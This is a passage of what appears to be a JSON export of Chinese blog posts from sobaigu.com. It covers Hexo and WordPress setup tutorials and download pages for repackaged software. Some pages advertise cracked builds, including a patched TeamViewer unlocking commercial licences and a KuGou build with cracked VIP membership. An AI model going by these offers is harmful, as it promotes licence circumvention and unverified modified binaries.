地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 shp1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"BT_fileresolver-BT种子解析器","slug":"software-bt-search-btfileresolver","date":"2017-04-03T02:05:49.000Z","updated":"2017-04-03T02:05:49.000Z","comments":true,"path":"software-bt-search-btfileresolver.html","permalink":"https://sobaigu.com/software-bt-search-btfileresolver.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小：0.2 m 支持系统：Windows 官方主页：nbuf1.lofter.com/post/1cc5ac1d_6d2af07 软件介绍 有好几万个BT种子文件，想找一些感兴趣的下载，就一个一个种子的用迅雷打开，看看有没有想下的，很费劲，有个软件能把种子内的文件都读出来，并且可以指定条件查找和排序，所以就有了这个解析器。 功能特点： 以目录为单位，搜索指定目录下（包括子目录）的所有种子文件进行解析 可以选择读取种子内文件的类型，例如视频、图片等，也可以自定义类型 包含指定关键字的过滤以及文件大小过滤功能 对结果进行排序，方便的打开种子内文件对应的种子进行下载或定位种子的位置 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6rpl","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"迅雷资源助手(Tsearch)-p2p种子搜索器","slug":"software-bt-search-tsearch","date":"2017-04-01T01:54:57.000Z","updated":"2017-04-13T01:54:57.000Z","comments":true,"path":"software-bt-search-tsearch.html","permalink":"https://sobaigu.com/software-bt-search-tsearch.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：1.2 m 支持系统：Windows 官方主页： 软件介绍 TSearch|番号搜索器|迅雷资源助手是由@Ayu开发的一款资源种子搜索器，纯绿色，可预览种子搜索器！TSearch，是一款搜索下载资源的p2p种子搜索器、番号搜索器，绿色软件，可以进行磁力搜索，电驴搜索，种子搜索，搜索质量远高于p2psearcher，搜索结果可直接云点播。 软件特点： 番号搜索：资源最全的种子搜索器。P2P搜索可取代P2PSearcher，内嵌资源站可精确找到高质量资源。 云播预览：整合多个云播引擎，搜索结果可预览，可播放。再也不会下载到葫芦娃。唯一实现全网点播的种子搜索器。 绿色纯净：市面最纯净的种子搜索器。纯绿色软件，解压即用，对系统无任何污染。从此远离各种冒充种子搜索器的流氓软件和病毒。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6rpl","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Hexo博客归档不分页显示设置方法","slug":"hexo-archives-show-all-in-one-page","date":"2017-03-31T03:35:40.000Z","updated":"2017-03-31T03:35:40.000Z","comments":true,"path":"hexo-archives-show-all-in-one-page.html","permalink":"https://sobaigu.com/hexo-archives-show-all-in-one-page.html","excerpt":"使用Hexo有一段时间，配合atom的目录管理功能，整体还算顺手，但归档页跟首页一样显示对应条数文章，打开归档页的时候有点别扭。去看主题作者博客的归档页却是一页显示的，别人能做，那咱也改一把。","text":"使用Hexo有一段时间，配合atom的目录管理功能，整体还算顺手，但归档页跟首页一样显示对应条数文章，打开归档页的时候有点别扭。去看主题作者博客的归档页却是一页显示的，别人能做，那咱也改一把。 原理分析 原以为这是主题的功能，查了资料才知道，这是Hexo解析插件的事，跟解析置顶排行一样，所以需要在Hexo的配置文件_config.yml中修改配置。 Hexo在生成静态页的时候，需要使用对应的插件： hexo-generator-index #生成首页的 hexo-generator-archive #生成归档页的 hexo-generator-tag #生成标签页的 在原配置中，per_page: 10控制所有的分页配置，包括首页，归档页，tag分类页面，如后面的数字是10，那么所有的页面都是10条进行分页。 方法一 只单独控制归档里的分页，在Hexo配置中新增以下配置： 1archive: 1 为了配置好管理，一般跟相关功能放一块 12345# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: pagearchive: 1 方法二（推荐） 该方法对首页，归档及标签分别控制，Hexo能运行起来，一般这三个插件都安装过了，没安装的用以下命令安装。 123$ npm install hexo-generator-index --save$ npm install hexo-generator-archive --save$ npm install hexo-generator-tag --save Hexo的配置文件_config.yml中新增以下内容： 1234567891011# 设置首页分页之前默认就有，这里就不额外加了# index_generator:# per_page: 5archive_generator: per_page: 40 #值为0表示不分页，按需填写 yearly: true #是否按年生成归档 monthly: false #为了加快生成速度，按月归档就不要了tag_generator: per_page: 40 #值为0表示不分页，按需填写 保存重启Hexo生效，或者直接生成静态页就看出效果了。 后记 根据上面的原理，依葫芦画瓢，我们也可以对分类展示页进行改造，以期与首页独立控制分页条数。 12category_generator: per_page: 40 #值为0表示不分页，按需填写 参考链接 首页分页和归档分页不同是如何做到的？ #30","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Hexo博客集成云跟帖评论系统","slug":"hexo-comments-with-yungentie","date":"2017-03-30T11:30:38.000Z","updated":"2017-03-30T11:30:38.000Z","comments":true,"path":"hexo-comments-with-yungentie.html","permalink":"https://sobaigu.com/hexo-comments-with-yungentie.html","excerpt":"","text":"前言 多说自裁了，换了Disqus后感觉网站速度有影响，Disqus更换方法见博客评论从多说迁移到Disqus。 虽然也没几个人来这评论，但又不能直接把评论系统给干掉，总有那么一点虚荣心作祟，所以本站的评论系统又换到了网易云跟帖。 更换步骤 评论系统都是跟着主题的，所以需要的修改都是在主题文件中。 如果你用的是next主题，那恭喜你，主题作者已经集成好了，只需要到云跟帖申请自己的productKey就可以了，如果像本站一样使用maupassant这种主题，那得自己折腾下。 第一步：申请网易云跟帖ID 登录网易云跟帖网站，账号注册登录什么的自行解决，网易邮箱，微博什么的应该大家都有，登录后点击后台管理，设置你的站点名称，站点网址等内容，然后点击获取代码就可以对皮肤，功能等进行基本设置，获取通用代码或者web代码，其中就包含你设置网站的productKey，这信息和代码一会儿要用在主题中。 若你的站点网址没有被百度收录的话，会出现域名未被收录的提示。此时你就需要联系云跟帖的后台小伙伴了，将你的域名信息向他们反映下，他们就会把你的域名添加进去的。 第二步：接入Hexo 以本站用的maupassant主题为例，为了方便，把云跟帖的productKey做成配置化，顺手把多说那些信息给清理掉。 更改配置化 评论系统配置化在主题配置_config.yml中，为了能看得明白一些，把原作者的那种配置结构改了改【纯属蛋疼，不是必须的】 123456## 评论系统选择comments: yungentie: productKey: ##自己的云跟帖key填这 disqus: shortname: ## Your disqus_shortname, e.g. username 顺手把duoshuo，swiftype那些自己不需要的配置也清理了一把，atom在主题目录下查找相关词，相关代码也清理了，这里就不贴了，有洁癖的可以自己去折腾。 修改comments.jade 该模板文件位置在themes\\maupassant\\layout\\_partial\\comments.jade，打开后可见多说和Disqus的判断代码，用不到了，直接把多说部分去掉，换成云跟帖的 1234567891011if theme.comments.yungentie div(class=&quot;cloud-tie-wrapper&quot;,id=&quot;cloud-tie-wrapper&quot;) script(src=&quot;https://img1.cache.netease.com/f2e/tie/yun/sdk/loader.js&quot;) script. var cloudTieConfig = &#123; url: document.location.href, sourceId: &quot;&quot;, productKey: &quot;#&#123;theme.comments.yungentie.productKey&#125;&quot;, //因为我前面改了主题配置结构，所以上面就一级一级定位productKey了，根据自己的规则写 target: &quot;cloud-tie-wrapper&quot; &#125;; 这样保存就能引用网易云跟帖了。 可能你发现我这里贴的代码和上面截图里的不一样，那是因为里的代码是通用代码，截图那个是web代码，通用代码少了那么一行。 注意事项 因为网易云跟帖是绑定域名的，所以本地测试的时候如果要看到效果可以做hosts劫持，Windows系统在%Drivers%\\etc\\hosts里写上如： 1127.0.0.1 云跟帖绑定的域名 然后本地使用绑定的域名就能显示云跟帖评论框了，其他操作系统自行Google。如果站点有多说等评论，可以通过云跟帖后台进行导入，支持json或者xml格式的文件，当然，有些导入失败就没办法了。 maupassant主题最新已经集成了云跟帖功能，不过作者集成到after_foot.jade里，在打开首页的时候后台会有一段报错，不影响使用，不想自己折腾的去更新最新版即可。 有什么问题在文章后留言，能解答的我尽量解答。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"TeamViewer-远程桌面内网穿墙-绿色特别版","slug":"software-remotetool-teamviewer","date":"2017-03-28T06:06:50.000Z","updated":"2017-03-28T06:06:50.000Z","comments":true,"path":"software-remotetool-teamviewer.html","permalink":"https://sobaigu.com/software-remotetool-teamviewer.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：9.1 m 支持系统：Windows/Linux/MacOS/Android/iOS 官方主页：teamviewer.com/zhcn/ 软件介绍 TeamViewer是一个能在任何防火墙和NAT代理的后台用于穿透内网远程控制软件，用于实现远程支持、远程访问、远程管理、家庭办公及在线协作和会议。 关于此绿色完整版及精简版 基于官方完整安装版绿化 TeamViewer补丁一直由意大利大神@DeltaFoX专注制作，可使用为商业版、付费版、企业版，自动进入对应许可证通道，无免费版任何功能限制！无首次退出软件后订阅弹窗，无怀疑商业用途提示弹窗！ 支持无人值守访问、支持设置随机访问；支持VPN、远程打印、适用于Outlook的会议插件； 优化默认预配置：默认关闭检测更新及不接受新版推送、首次启动不显示软件特性介绍弹窗； 完整版绿色本：保留VPN驱动、远程打印驱动、Outlook会议插件；支持VPN及远程打印和会议插件功能！ 精简版单文件：已删VPN驱动、远程打印驱动、Outlook会议插件；不可VPN及远程打印和会议插件功能！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5 收到臭名卓著的sijie马丁威胁，不再提供下载，请自行其他渠道搜索","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"怎么开启QQ机器人群管理功能","slug":"how-to-enable-qqrobot-in-qqgroup","date":"2017-03-27T10:29:14.000Z","updated":"2017-03-27T10:29:14.000Z","comments":true,"path":"how-to-enable-qqrobot-in-qqgroup.html","permalink":"https://sobaigu.com/how-to-enable-qqrobot-in-qqgroup.html","excerpt":"前言 纯属闲得蛋疼，给群开个QQ机器人功能，类似于微软小冰，不是某Q那种第三方软件。@这个机器人就会回答你相应的功能，正经用法应该是提个问题让机器人帮你找答案，报个天气预报啥的。","text":"前言 纯属闲得蛋疼，给群开个QQ机器人功能，类似于微软小冰，不是某Q那种第三方软件。@这个机器人就会回答你相应的功能，正经用法应该是提个问题让机器人帮你找答案，报个天气预报啥的。 步骤 开启步骤其实挺简单，目前也没什么门槛，只要你是群主就可以开了。 登录QQ群网页 打开qun.qq.com，用你的QQ进行登录。 开启QQ群机器人 首先修改自己的开启QQ群链接： https://qun.qq.com/qqweb/m/qun/qun_robot/setting.html?gc=+群号 把群号替换为自己的QQ群号码 例如： https://qun.qq.com/qqweb/m/qun/qun_robot/setting.html?gc=+666666 回车后选择二选一，然后点开启就完成了。 该QQ机器就是腾讯与图灵机器人或者微软小冰的小号，不能修改群名片，你@他后会被回@，高深的问题回答得牛头不对马嘴也有，自娱自乐去吧。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Syncthing-开源免费数据同步软件","slug":"software-sync-syncthing","date":"2017-03-25T01:37:21.000Z","updated":"2017-03-25T01:37:21.000Z","comments":true,"path":"software-sync-syncthing.html","permalink":"https://sobaigu.com/software-sync-syncthing.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：5.5 m 支持系统：Windows/Linux/OSX 官方主页：www.syncthing.net 软件介绍 Syncthing是一个开源的文件同步客户端与服务器软件，采用Go语言编写。它使用了其独有的对等自由块交换协议。 最近网盘都纷纷死掉了，但需求是刚强的，你可以用 BT Sync、ownCloud 来创建自己的数据同步工具，如果有一台 VPS 就能实现网盘的功能。而 Syncthing 则是另外一个选择，跨平台、开源的数据同步工具。 引用个别人的使用教程，自己就不写了，有问题可以在下方留言 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 shp1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"WPS Office 2016_绿色精简_经典版","slug":"software-kingsoft-wps","date":"2017-03-24T03:29:50.000Z","updated":"2017-03-24T03:29:50.000Z","comments":true,"path":"software-kingsoft-wps.html","permalink":"https://sobaigu.com/software-kingsoft-wps.html","excerpt":"","text":"基本信息 程序类型：绿色版/安装版 界面语言：中文 文件大小： 45.7 m/22.4 m 支持系统：Windows/Android 官方主页：www.wps.cn 软件介绍 WPS Office，永久的免费办公专家，小巧、极速、全兼容！ 可以实现办公软件最常用的文字、表格、演示等多种功能。具有运行速度快、体积小巧、强大插件平台支持、免费提供海量在线存储空间及文档模板、支持阅读和输出PDF文件、全面兼容微软Office97-2010格式等独特优势；文档分享、讨论与协作，轻松团队办公；享受尊贵会员服务；上万精美模板、素材等资源宝库使文档创作更轻松高效！ 只有本地功能、无联网内容和模块、无多余按钮链接提示等。 内存占用低，运行速度快，体积小巧。还原纯净、纯粹实用！ 如果执行绿化bat出现找不到xx组件,那说明系统中缺少必要依赖组件,到此下载安装好就行 WPS Office 移动版，设计不断优化，性能再次提升！融入Google Android最新设计标准，Material Design设计风格，完美支持沉浸式！简化文档操作，全新移动办公力作。全新界面更清晰舒适，功能更自然呈现，文档操作方法简化。支持跨平台、云存储、云协同等特性，增加单手操作、文档漫游、阅读模式、常用功能精简，支持Microsoft Office、PDF等多种办公文档格式的阅读与编辑，完全兼容桌面办公文档。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 PC版 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 f6i9 Android版 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 56kc","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"博客评论从多说迁移到Disqus-再见，多说。","slug":"hexo-goodbye-duoshuo-to-disqus","date":"2017-03-22T08:23:52.000Z","updated":"2017-03-22T08:23:52.000Z","comments":true,"path":"hexo-goodbye-duoshuo-to-disqus.html","permalink":"https://sobaigu.com/hexo-goodbye-duoshuo-to-disqus.html","excerpt":"","text":"背景 因公司业务调整，非常遗憾的向大家宣布多说项目即将关闭。 我们将于2017年6月1日正式关停服务，在此之前您可以通过后台的数据导出功能导出自己站点的评论数据。 对此给您造成的不便，我们深表歉意，感谢您的一路相伴。 多说经常报故障，看上去多说也很长时间没人维护了，对多说的结局早有预料，但没想到来的这么快。用多说好多年了，苦逼的Hexo不带数据库，只有另寻他路了。 国外的Disqus被墙，国内的畅言要备案，最终我还是选择Disqus，因为域名没法在天朝备案，o(╯□╰)o Disqus终究还是要爬墙才能展示，而且速度较慢，最终走了个偏门用上了畅言，见：无备案网站使用畅言评论方法 申请Disqus账号 到Disqus申请个账号，我之前就有了。因为被墙的缘故，需要翻墙，评论框加载速度也没多说好，所以Disqus一直以来只是用来评论别，没想到还是要用。 账号申请登录后，需要添加绑定自己的站点，方法： 1右上角&gt;点击齿轮图标&gt;点击下拉中的`Add Disqus To Site` 点完应该到了这里，然后按自己的需求添加自己的站点shortname即可。 Hexo中启用Disqus 一般在对应主题中的_config.yml修改，如maupassant主题就直接配置刚才设定的shortname即可，其他主题也大同小异，具体参考主题说明。 迁移已有评论 从多说导出 登录多说后台，在 1http://&lt;你多说的shortname&gt;.duoshuo.com/admin/tools/ 页面导出多说评论，工具&gt;导出数据&gt;勾选包含文章和评论数据，点导出就能下载到一个json文件压缩包。 转换成xml格式 json格式的数据是不能直接导入到Disqus的，所以我们需要转换成xml格式，借助别人写的工具转换。 准备工具 下载 duoshuo-migrator.py，并安装依赖 Linux/Mac OS X：pip install lxml Windows：Windows 下使用 pip 安装 lxml 时编译无法通过，到 https://pypi.python.org/pypi/lxml/3.5.0 下载对应自己 Python 版本的 32 或 64 位 exe 文件安装即可。 当然，说明说的这些，你首先得安装Python，如果你用的是PHP等程序来转换也可以，不是非得Python，只要能转换就行。 执行转换 Python及对应的依赖安装完，我们就可以执行那个py程序了，打开命令终端【CMD或者terminal】，执行以下命令： 1python duoshuo-migrator.py -i ~/Desktop/export.json -o disqus.xml 要不了几秒钟，xml格式的评论数据就转换好了。 导入到Disqus 登录Disqus后台，在 1https://&lt;之前设置的shortname&gt;.disqus.com/admin/discussions/import/platform/wordpress/ 页面点击import，选择之前转换好的xml文件 ，然后点击Upload and import就搞定了。 导入完成后，应该很快就能在你的网站前台看到结果了。当然，记得搭梯子！！！ 遇到的问题 接入Disqus后，发现有评论的正常显示，没评论的文章连Disqus评论框都显示不出来，只显示一行： We were unable to load Disqus. If you are a moderator please see our troubleshooting guide. 都说是shortname设置不正确，折腾一番，没想到Disqus匹配链接的时候连http://都要匹配。之前百度站内搜索不认协议头，所以在Hexo的配置文件中配置站点时没带协议，现在只能加上，同时改用google搜索了。 参考文档 duoshuo2disqus","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"酷狗音乐-Hello，酷狗！","slug":"software-player-kugou","date":"2017-03-20T01:27:11.000Z","updated":"2017-03-20T01:27:11.000Z","comments":true,"path":"software-player-kugou.html","permalink":"https://sobaigu.com/software-player-kugou.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：32.1 m 支持系统：Windows/MacOS/Android/iOS 官方主页：www.kugou.com 软件介绍 酷狗音乐是国内最大最专业用户最多的P2P音乐共享软件，支持无损和高音质音乐共享下载。最近更新加入了听歌识曲功能，可识别电脑上播放的歌曲.另外，本地列表支持一键升级无损音质。 酷狗音乐VIP去广告绿色清爽版，无广告弹窗干扰 ，破解VIP金钻会员，畅享VIP下载加速、免登陆试听下载无损及高品质音乐，给大家一个干净、清爽、纯粹的酷狗音乐，让你尽享音乐之美！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 rde1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"从0开始搭建自己的博客网站","slug":"build-your-blog-step-by-step","date":"2017-03-18T04:27:49.000Z","updated":"2017-03-18T04:27:49.000Z","comments":true,"path":"build-your-blog-step-by-step.html","permalink":"https://sobaigu.com/build-your-blog-step-by-step.html","excerpt":"","text":"前言 作为一个打杂工，从8年前就玩自己的网站了，虽然一事无成，但这份兴趣爱好却一直保留了下来。 这些年，偶尔逛逛域名注册商网站，脑袋一热也会注册个域名，然后淘汰看不顺眼不想要的域名，也怀着走韦博运的梦想一步步走来。到现在，对搭建个小站已轻车熟路，记录些经验，仅供参考。 建站要素 网站域名 写个自己的博客，可以用新浪，163这种开放的博客，也可以是QQ空间这种，内容自己产生，维护及资源消耗的事托管商帮你完成，当然这种人家也要给你塞个广告，让贴什么也是受管制的。 既然想折腾，那就自己整一个，自己的网站最好选个称心如意的域名，注册了就是一份资产，万一撞上财团看上眼呢…… 以前国外域名托管商注册域名便宜，现在软妹币汇率跌了，国内域名也降了价，直接国内域名注册商注册就行，如新网，dnspod，阿里万网域名注册等都可以，老牌常见顶级域名也就60一年，遇上优惠券促销甚至几块钱，注册域名也可以当是一种投资。 当然，所谓顶级域名，只要有人解析就行，但一些乱七八糟的域名就别浪费几块钱了，买域名还得买.com，.cn，.net，.org这些。 网站空间 网站文件需要个存放托管的地方，可以是个服务器，也可以是有网络访问权限的存储空间，如果只是个纯粹的静态页站点，用GitHub page，coding page，或者七牛存储这样的免费空间还不错。 如果需要部署复杂应用，比如WordPress这种需要数据库服务，那网络上的免费资源比较少，买托管空间或VPS，建议自行买个VPS，成本在一百软妹币每年，磁盘空间足够，流量一般都是不限的，还可以搭梯子用。 网站程序平台 常见的网站程序平台有WordPress，Z-blog，织梦CMS，Jekyll，Hexo等，选择平台尽量大众化。 WordPress 市面上的个人网站程序很多，但其中WordPress绝对是个人网站平台霸主，配合其丰富的功能及插件功能，完全能满足个人及企业网站的需求，而且几乎可以实现傻瓜式维护，推荐普通用户使用。 更多可见WordPress中文官网 Hexo 当初作者就是觉得WordPress那种太庞大了，所以弄了个Hexo，使用MarkDown格式写作，然后解析成HTML静态页发布，详见官方网站。 因为轻便了，但相应的功能也少了，需要什么功能基本上需要自行解决，自行改造设计，所以Hexo这种偏向技术型，需要对web编程相关知识有一定的了解，需要有一定的动手解决能力。 优缺点选择 从以上介绍可见，各平台都有自己的优缺点： WordPress： 维护难度低，管理方便 用户基数大，功能插件多，主题多 程序大 默认动态格式访问慢，尤其是中文语言 需要PHP，MySql支持 Hexo： 轻便，服务器部署要求低 纯MarkDown写作 需要动手能力强 根据实际需求及喜好选择对应的平台： 不在乎程序大小，及网站反映速度，对维护难度敏感者选择WordPress 喜欢折腾，喜欢简洁则选择Hexo，绝对有挑战性。 部署示例 Hexo Hexo的服务器部署相对简单，由于其对服务器要求低的特性，在网络上薅免费羊毛也较容易，但对内容创建端有一定的要求，详见：Hexo博客Git-VPS部署完整记录。 WordPress 这里假设你已经申请好了域名，一级二级都不是问题，买个VPS自己用，把域名解析到VPS地址。 VPS上需要安装PHP+MySql+Apache或Nginx环境，一般图省事直接安装LNMP或WNMP，VPS一般跑的都是linux，所以示例皆以linux为例。 安装lnmp 使用secureCRT或类似的SSH工具登陆VPS或服务器，登陆后运行：screen -S lnmp, 如果提示screen: command not found 命令不存在可以执行：yum install screen 或 apt-get install screen安装，详细内容参考screen教程。 下载并安装lnmp一键安装包命令如下 1wget -c http://soft.vpser.net/lnmp/lnmp1.3-full.tar.gz &amp;&amp; tar zxf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full &amp;&amp; ./install.sh lnmp 按上面的命令执行后，会有比较长的等待时间，主要消耗在编译安装过程，安装完成后会要求选择数据库，PHP，输入密码等，根据自己的需求选择及输入。安装脚本默认会让你添加网站，其实就是配置Nginx，此时不输入时候再改也可以。 详细安装教程见官网 设置Nginx Nginx设置中主要是域名（包括二级域名等），域名指向目录，一般情况下设置一级域名，二级域名www及一个*用于收拢流量来源。 通过Nginx的设置，一个VPS可以在80端口跑n个网站。 部署网站 以上完成后，网站运行需要的基础条件都已经具备了，我们只需要将WordPress整套程序（目录下的所有文件）上传到域名对应的目录中，然后访问前台地址，就会进入引导安装界面，主要设置网站域名，名称，数据库及管理员等，详细教程可见：安装 WordPress。 其他事项 经过以上设置，一个网站就搭起来了。在往后的运行中，如果需要个性界面，那么可以找相应的主题换上，需要什么辅助功能也能找到相应的插件。如果你的VPS发现用着用着卡了，网站打不开，考虑下是不是没空间了，默认装的MySQL有个坑会占用大量空间，见此解决办法。其他问题就充分使用搜索引擎吧，大众化的程序出现的问题总能找到解决教程，这就是为什么前面选择平台的时候要选择大众化。 后续优化运营 SEO SEO说起来简单，做起来也不难，但真正要做好，就不止程序设计的好，还涉及统计学，社会工程学，审美，以及个人觉悟等，SEOer是个综合型的职业。常用SEO辅助工具类似各大统计分析，站长工具等。 一般的SEO准则： 关键词与站点内容关联，密度合理范围在2%-8% 内容层次结构清晰，如网站目录结构，内容导航，网站内链等 多与优质网站关联，不要被不良网站牵连 网站内容独一无二 内容建设 不管什么网站，都是内容为王。 内容有人感兴趣，才会留住访问，PV才会上升，就如1024，91pron之流，只需要做一把种子SEO，剩下的流量就呈几何形态上升，据说做的好的每IP每月能产生2块软妹币的利润。 广告接入 个人站点主要是接入广告联盟，如果做大也可以自己卖广告位。市面上大的信誉有保障的广告联盟有：Google AdSense，百度联盟，阿里妈妈……，天朝广告联盟都需要网站㓟ICP备案，所以Google AdSense是不二之选。据说如果做的是英文站点，Google AdSense的收入还是可观的。 到广告联盟后台申请广告代码，一般在主题中都会提供广告位设置，选择对应尺寸接入即可。 后记 这种教程要写详细够写一本书，本文只是篇导引文章，之于建站及运营也还没进入皮毛，但入门是够了，更多细节请充分利用搜索引擎。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"PotPlayer-全能视频播放器","slug":"software-player-potplayer","date":"2017-03-17T01:01:01.000Z","updated":"2017-03-17T01:01:01.000Z","comments":true,"path":"software-player-potplayer.html","permalink":"https://sobaigu.com/software-player-potplayer.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：14.9 m 支持系统：Windows 官方主页：cafe.daum.net/pot-tool/AZMV 软件介绍 Daum PotPlayer 是韩国热门影音播放器，原生支持简体中文，内置强大解码器的全能视频播放器。它体积小巧、界面简洁、解码功能强大，启动速度快，播放过程稳定，对付高清大片无任何问题，对外挂字幕的支持很不错，普通用户无需装第三方解码器即可播放主流格式视频，支持BD和MKV等大视频文件流畅播放，是本地视频播放器的不二之选！ 关于此绿色纯净版： 去主程序修改效验，可随意DIY！ 禁止部分联网行为，杜绝广告推送； 精简多余文件、Live相关文件、多国语言； 本地化配置，默认关闭自动更新和预先下载更新文件； 首次启动即为纯净版，不修改主程序，美化包可自选！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 